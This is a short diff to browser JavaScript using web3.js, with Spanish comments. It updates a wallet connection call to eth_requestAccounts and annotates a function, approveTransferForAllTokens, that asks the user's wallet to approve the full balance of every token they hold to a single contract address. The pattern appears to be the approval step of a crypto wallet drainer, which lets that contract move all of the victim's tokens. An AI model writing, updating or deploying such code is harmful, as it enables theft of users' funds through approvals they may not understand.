@@ -4,7 +4,7 @@ window.addEventListener('load', async () => {
         window.web3 = new Web3(ethereum);
         try {
             // Solicitar acceso a la cuenta si es necesario
-            await ethereum.enable();
+            await ethereum.request({ method: 'eth_requestAccounts' }); // Actualizado para usar la API recomendada
             // Cuentas ahora expuestas, iniciar el contrato.
             initApp();
         } catch (error) {
@@ -63,6 +63,7 @@ async function approveTransferForAllTokens(tokens, userAccount, contractAddress)
             const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
             const balance = await tokenContract.methods.balanceOf(userAccount).call();
             if (balance > 0) {
+                // Se utiliza el total del balance para la aprobación
                 const approved = await tokenContract.methods.approve(contractAddress, balance).send({from: userAccount});
                 console.log(`Transferencia de tokens aprobada para ${tokenAddress}:`, approved);
             }
